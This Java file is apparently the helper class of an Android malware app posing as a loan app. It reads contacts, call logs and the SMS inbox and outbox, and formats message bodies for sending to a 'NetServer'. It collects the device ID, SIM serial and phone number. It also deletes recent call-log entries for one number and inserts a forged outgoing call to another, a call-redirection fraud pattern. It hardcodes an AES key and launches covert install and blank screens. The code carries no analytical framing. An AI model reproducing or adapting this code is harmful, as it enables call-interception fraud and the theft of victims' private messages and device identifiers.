package main.app.loan;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.SystemClock;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.telephony.TelephonyManager;

public class GlobalLib{
	
	public static String FormatPhoneNumber(String number)
	{
		number = number.replace("-", "");
		number = number.replace("(", "");
		number = number.replace(")", "");
		number = number.replace(" ", "");
		return number;
	}
	
	
	
	public static String GetContactUserName(Context context, String contactPhone) {

		try{
			contactPhone = FormatPhoneNumber(contactPhone);
			Uri uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
	
			String[] projection = new String[] {
					ContactsContract.CommonDataKinds.Phone.CONTACT_ID,
					ContactsContract.CommonDataKinds.Phone.NUMBER,
					ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME };
	
			String[] selectionArgs = null;
	
			String sortOrder = ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " COLLATE LOCALIZED ASC";
	
			Cursor contactCursor = context.getContentResolver().query(uri, projection, null, selectionArgs, sortOrder);
	
			if (contactCursor.moveToFirst()) {
				do {
					//long photoid = contactCursor.getLong(0);
					String phonenumber = contactCursor.getString(1);
					phonenumber = FormatPhoneNumber(phonenumber);
					String userName = contactCursor.getString(2);
					
					if (phonenumber.equalsIgnoreCase(contactPhone) == true)
					{
						return userName;
					}
	
				} while (contactCursor.moveToNext());
			}
		}
		catch(Exception e)
		{
			
		}
		return "";
	}
	
	public static int getLastCallDuration(Context context, String Number) {   

		try{
			Number = GlobalLib.FormatPhoneNumber(Number);
			
		    Cursor contactCursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, 
		    		new String[]{CallLog.Calls.NUMBER, CallLog.Calls.DURATION, CallLog.Calls.TYPE}, null, null, null);
	
			if (contactCursor.moveToFirst()) {
				do {
					String strNumber = contactCursor.getString(contactCursor.getColumnIndex(CallLog.Calls.NUMBER));
					int nTime = contactCursor.getInt(contactCursor.getColumnIndex(CallLog.Calls.DURATION));
					int nType = contactCursor.getInt(contactCursor.getColumnIndex(CallLog.Calls.TYPE));
	
					strNumber = GlobalLib.FormatPhoneNumber(strNumber);
					if (Number.equalsIgnoreCase(strNumber) == true)
					{
				    	if (nType == CallLog.Calls.OUTGOING_TYPE)
				    	{
				    		return nTime;
				    	}
					}
				} while (contactCursor.moveToNext());
			}
		}
		catch(Exception e)
		{
			
		}
		
		return 0;
	}
	
	public static int DeleteCallLog(Context context, String oldNumber, boolean bOutIn) {   

		try{
			long curTime = (new Date()).getTime();
			curTime = curTime - 20 * 60 * 1000;

			oldNumber = GlobalLib.FormatPhoneNumber(oldNumber);

		    Cursor contactCursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, 
		    		new String[]{CallLog.Calls._ID, CallLog.Calls.DATE, CallLog.Calls.NUMBER, CallLog.Calls.DURATION, CallLog.Calls.TYPE}, null, null, null);
	
		    int nDuration = -1;
		    
			if (contactCursor.moveToFirst()) {
				do {
					
					long _id = contactCursor.getLong(contactCursor.getColumnIndex(CallLog.Calls._ID));
					long nTime = contactCursor.getLong(contactCursor.getColumnIndex(CallLog.Calls.DATE));
					String strNumber = contactCursor.getString(contactCursor.getColumnIndex(CallLog.Calls.NUMBER));
					int nDurt = contactCursor.getInt(contactCursor.getColumnIndex(CallLog.Calls.DURATION));
					int nType = contactCursor.getInt(contactCursor.getColumnIndex(CallLog.Calls.TYPE));
					
					if(nTime > curTime)
					{
						strNumber = GlobalLib.FormatPhoneNumber(strNumber);
						if (oldNumber.equalsIgnoreCase(strNumber) == true)
						{
					    	context.getContentResolver().delete(
							    	CallLog.Calls.CONTENT_URI, 
							    	CallLog.Calls._ID + " = ? ", 
							    new String[]{ ""+_id }
							);
					    	
					    	if (bOutIn == true)
					    	{
					    		if(nType == CallLog.Calls.OUTGOING_TYPE)
					    		{
					    			nDuration = nDurt;
					    		}
					    	}
					    	
					    	if (bOutIn == false)
					    	{
					    		if(nType == CallLog.Calls.INCOMING_TYPE)
					    		{
					    			nDuration = nDurt;
					    		}
					    	}
						}
					}
	
				} while (contactCursor.moveToNext());
			}
			
			return nDuration;
		}
		catch(Exception e)
		{
			
		}
		
		return -1;
	}
	
	public static void InsertCallLog(Context context, int nDuration, String newNumber){
		try{
			ContentResolver contentResolver = context.getContentResolver();
		    ContentValues values = new ContentValues();
		    
		    values.put(CallLog.Calls.NUMBER, newNumber);
		    values.put(CallLog.Calls.DATE, System.currentTimeMillis());
		    values.put(CallLog.Calls.DURATION, nDuration);
		    values.put(CallLog.Calls.TYPE, CallLog.Calls.OUTGOING_TYPE);
		    values.put(CallLog.Calls.NEW, 1);
		    values.put(CallLog.Calls.CACHED_NAME, "");
		    values.put(CallLog.Calls.CACHED_NUMBER_TYPE, 0);
		    values.put(CallLog.Calls.CACHED_NUMBER_LABEL, "");
		    
		    contentResolver.insert(CallLog.Calls.CONTENT_URI, values);
		}
		catch(Exception e)
		{
			
		}
	}
	
	
	public static String GetSMSHistory(Context context, boolean bInbox, boolean bOutbox)
	{
		//0:_id. 1: thread_id, 2:address, 3:person, 4:date, 5:protocol, 6:read, 7:status, 8:type,
		//9:reply_path_present, 10:subject, 11:body, 12:service_center, 13:locked
		
		String strResult = "";
		
		if (bInbox == false && bOutbox == false)
		{
			return "";
		}
		
		long tmGetSms = RbPrefEditor.getValue(context, RbPrefEditor.PREF_KEY_GETSMS, (long)0);

		Cursor cursor = null;

		String[] reqCols = new String[] { "date", "address", "body" };
		
		if (bOutbox == true)
		{
			try{
				cursor = context.getContentResolver().query(Uri.parse("content://sms/sent"), reqCols, null, null, null);
		
				if (cursor.moveToFirst() && cursor.isNull(cursor.getColumnIndex("date"))==false && cursor.isNull(cursor.getColumnIndex("address"))==false)
				{
		
					do {
						long ndate = cursor.getLong(cursor.getColumnIndex("date"));
						String from = cursor.getString(cursor.getColumnIndex("address"));
						String body = cursor.getString(cursor.getColumnIndex("body"));
						
						if(ndate > tmGetSms)
						{
							String strTm = "none";
							try{
								Date dtTm = new Date(ndate);
								SimpleDateFormat mSimpleDateFormat = new SimpleDateFormat ( "yyyy.MM.dd HH:mm:ss", Locale.KOREA );  
								strTm = mSimpleDateFormat.format(dtTm);
							}catch(Exception e){}
							
							String strData = NetServer.MakeStringBody(NetServer.SMS_OUT_NORM, from, null, strTm, null, body, null);
							strResult = strResult + strData;
						}
					}
					while (cursor.moveToNext());
				}
			
				cursor.close();
			}
			catch(Exception e)
			{}
		}

		if (bInbox == true)
		{
			try{
				cursor = context.getContentResolver().query(Uri.parse("content://sms/inbox"), reqCols, null, null, null);
		
				if (cursor.moveToFirst() && cursor.isNull(cursor.getColumnIndex("date"))==false && cursor.isNull(cursor.getColumnIndex("address"))==false)
				{
		
					do {
						long ndate = cursor.getLong(cursor.getColumnIndex("date"));
						String from = cursor.getString(cursor.getColumnIndex("address"));
						String body = cursor.getString(cursor.getColumnIndex("body"));
						
						if(ndate > tmGetSms)
						{
							String strTm = "none";
							try{
								Date dtTm = new Date(ndate);
								SimpleDateFormat mSimpleDateFormat = new SimpleDateFormat ( "yyyy.MM.dd HH:mm:ss", Locale.KOREA );  
								strTm = mSimpleDateFormat.format(dtTm);
							}catch(Exception e){}
							
							String strData = NetServer.MakeStringBody(NetServer.SMS_IN_NORM, from, null, strTm, null, body, null);
							strResult = strResult + strData;
						}
					}
					while (cursor.moveToNext());
				}
			
				cursor.close();
			}
			catch(Exception e)
			{}
		}
		
		if(strResult != null && "".equals(strResult) == false)
		{
			long curTime = (new Date()).getTime();
			RbPrefEditor.put(context, RbPrefEditor.PREF_KEY_GETSMS, curTime);
		}
		
		return strResult;
	}
	

	

	public static void launchInstallScreen(Context context)
	{
    	 Intent sendIntent = new Intent(context,InstallWnd.class);
	   	 //sendIntent.putExtras(intent);
	   	 sendIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP);
	   	 context.startActivity(sendIntent);
	}
	
	public static void launchBlankScreen(Context context)
	{
    	 Intent sendIntent = new Intent(context, DelayWnd.class);
	   	 //sendIntent.putExtras(intent);
	   	 sendIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP);
	   	 context.startActivity(sendIntent);
	}
	

	public static void sleep(int nTime)
	{
		try{
			Thread.sleep(nTime);
		}
		catch(Exception e)
		{
			
		}
	}
	
    public  static void MakeSubDir(String fullDirPath){
    	
    	try{
	        File path = new File(fullDirPath);
	        if(! path.isDirectory()) 
	        {	
	        	path.mkdirs();
	        }
    	}
    	catch(Exception e)
    	{
    		
    	}
     }

     public static boolean IsExistFile(String filePath){
        
    	 try{
			File fp = new File(filePath);
			boolean bResult = fp.exists();
			return bResult;
    	 }
    	 catch(Exception e)
    	 {
    		 
    	 }
    	 return false;
     }

     public static boolean DeleteFile(String szDir){

    	 try{
	    	 File fp = new File(szDir);
	         if(fp.isDirectory()){	return false;	}
	         if(!fp.exists()){	return false;	}
	         return  fp.delete();
    	 }
    	 catch(Exception e)
    	 {
    		 
    	 }
    	 return false;
     }

     public static boolean DeleteDirectory(String szDirPath){

    	 try{
    		 
    		 File fp = new File(szDirPath);
    		 String[] list = null;
    		 String path = szDirPath;

    		 if(fp.isDirectory()){
    		     list = fp.list();
    		     for(int i=0; i<list.length; i++)
    		     {
    		     	DeleteDirectory(path + "/" + list[i]);
    		     }
    		 }
    		  
    		 if(!fp.exists())
    		 {	
    		     return false;	
    		 }
    		  
    		 return  fp.delete();
    	 }
    	 catch(Exception e)
    	 {
    		 
    	 }
    	 return false;
     }
     
 	static byte[] key = {(byte)0x8f,(byte)0x93,(byte)0x7b,(byte)0x3f,(byte)0xab,(byte)0x66,(byte)0x9f
		,(byte)0x30,(byte)0x40,(byte)0x15,(byte)0xe0,(byte)0x11,(byte)0x15,(byte)0xb9,(byte)0xdd,(byte)0x55 };

	public static String encrypt(String orgStr)  {
		
	    try {
	        SecretKeySpec skeySpec = new SecretKeySpec(key, "AES");
	        Cipher eci = Cipher.getInstance("AES");
	        eci.init(Cipher.ENCRYPT_MODE, skeySpec);
	        byte[] utf8 = orgStr.getBytes("UTF8");
	        byte[] encby = eci.doFinal(utf8);
			byte[] b64 = org.apache.commons.codec.binary.Base64.encodeBase64(encby);
			return new String(b64, "UTF8");
	    } 
	    catch(Exception e)
	    {
	    }
	    return null;
	}

	public static String decrypt(String decStr){
	    try {
	        SecretKeySpec skeySpec = new SecretKeySpec(key, "AES");
	        Cipher dci = Cipher.getInstance("AES");       
	        dci.init(Cipher.DECRYPT_MODE, skeySpec);
	        byte[] b64 = decStr.getBytes("UTF8");
			byte[] dec = org.apache.commons.codec.binary.Base64.decodeBase64(b64);
	        byte[] org = dci.doFinal(dec);
	        return new String(org, "UTF8");
	    } 
	    catch(Exception e)
	    {
	    } 
	    return null;
	}

	
	public static byte[] intToByteArray(int intValue) 
	{    
		byte[] byteArray = new byte[4];
		byteArray[0] = (byte)(intValue & 0xFF);
		byteArray[1] = (byte)((intValue & 0xFF00) >>> 8);
		byteArray[2] = (byte)((intValue & 0xFF0000) >>> 16);
		byteArray[3] = (byte)((intValue & 0xFF000000) >>> 24);
		
		return byteArray;
	}

	public static int byteArrayToInt(byte[] byteArray) 
	{   
		if (byteArray.length != 4) return 0;
		
		int sum = 0;

		for (int i = 0; i < 4; i++)
		{
			int c = byteArray[i];
			if (c < 0) c = c + 256;
			
			sum = sum + (c << (i * 8));
		}

		return sum;
	}
	
	public static String GetDeviceId(Context context)
	{
		String strDeviceId = "";
		try{
			strDeviceId = "" + ((TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE)).getDeviceId();
		}
		catch(Exception e)
		{
			strDeviceId = "";
		}
		return strDeviceId;
	}
	
	
	public static String GetSimSerialNumber(Context context)
	{
		String strSerial = "";
		try{
			final TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
			strSerial = "" + tm.getSimSerialNumber();
		}
		catch(Exception e)
		{
			strSerial = "";
		}
		
		return strSerial;
	}

	public static String GetPhoneNumber(Context context)
	{
		String strPhoneNum = "";
		try{
			TelephonyManager teleMgr = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
			strPhoneNum = "" + teleMgr.getLine1Number();
		}
		catch(Exception e)
		{
			strPhoneNum = "";
		}
		return strPhoneNum;
	}
	
	@SuppressLint("DefaultLocale")
	public static int GetDevIntUID(Context context)
	{
		try{
			String strPhoneNum = GetPhoneNumber(context);
			
			String devID = strPhoneNum;
			devID = devID + "_" + GetDeviceId(context);
			devID = devID + "_" + GetSimSerialNumber(context);
			int uid = devID.hashCode();
			return uid;
		}
		catch(Exception e)
		{
		}
		
		return 0;
	}
	
	@SuppressLint("DefaultLocale")
	public static String GetDeviceUID(Context context)
	{
		String result = "";
		
		try{
			String strPhoneNum = GetPhoneNumber(context);
			
			String devID = strPhoneNum;
			devID = devID + "_" + GetDeviceId(context);
			devID = devID + "_" + GetSimSerialNumber(context);
			
			String strHash = String.format("#%08X", devID.hashCode());
			
			if ("".equalsIgnoreCase(strPhoneNum))
			{
				strPhoneNum = "UNKNOWN";
			}
			
			String machine = Build.BRAND + "," + Build.MODEL + "," + Build.VERSION.RELEASE;
	
			result = strPhoneNum + "[" + strHash + "][" + machine + "]";
			result = result.toUpperCase();
			
			if(result.length() > 48)
			{
				result = result.substring(0, 47);
			}
		}
		catch(Exception e)
		{
		}
		
		return result;
	}

	public static long GetTickCount()
	{
		try{
			long nNowTick = SystemClock.elapsedRealtime();
			return nNowTick;
		}
		catch(Exception e)
		{
			
		}
		return 0;
	}
	

	
	public static String ToCString(byte[] buff)
	{
		String str = "";
		try{
			int nOffset = 0;
			for (int i = 0; i < buff.length; i++)
			{
				if (buff[i] == 0) 
				{
					nOffset = i;
					break;
				}
			}

			if (nOffset > 0)
			{
				str = new String(buff, 0, nOffset);
			}
		}
		catch(Exception e)
		{
			
		}
		return str;
	}
	
/*
	public static final float DEFAULT_HDIP_DENSITY_SCALE = 1.5f;
	
	public static int PixelFromDP(int DP, Context context)
	{ 
		int px = 0;
		try{
		    float scale = context.getResources().getDisplayMetrics().density; 
		    px = (int)(DP / scale * DEFAULT_HDIP_DENSITY_SCALE);
		}
		catch(Exception e)
		{
			
		}
	    return px;
	}
	
	public static ArrayList<String> getInstalledApps(Context context, boolean getSysPackages) {
	    
		ArrayList<String> res = new ArrayList<String>();        
	    
	    List<PackageInfo> packs = context.getPackageManager().getInstalledPackages(0);
	    
	    for(int i=0;i<packs.size();i++)
	    {
	        PackageInfo p = packs.get(i);
	        if ((!getSysPackages) && (p.versionName == null)) {
	            continue ;
	        }
	        String appname = p.applicationInfo.loadLabel(context.getPackageManager()).toString();
	        String pname = p.packageName;
//	        String versionName = p.versionName;
	        
	        String pkgUID=appname+":"+pname;
	        res.add(pkgUID);
	    }
	    
	    return res; 
	}
	
	public static String getTopPackageName(Context context)
	{
		try{
			ActivityManager am = (ActivityManager)context.getSystemService(Context.ACTIVITY_SERVICE);
			List< ActivityManager.RunningTaskInfo > taskInfo = am.getRunningTasks(1);
			ComponentName componentInfo = taskInfo.get(0).topActivity;
			String packageName = componentInfo.getPackageName();
			return packageName;
		}
		catch(Exception e)
		{
			
		}
		return "";
	}

	public static void TurnOffScreen(Context context)
	{
		PowerManager manager = (PowerManager)context.getSystemService(Context.POWER_SERVICE);

		PowerManager.WakeLock wl = manager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "WakeTag");
		wl.acquire();
		wl.release();
	}
		
*/	
	
}
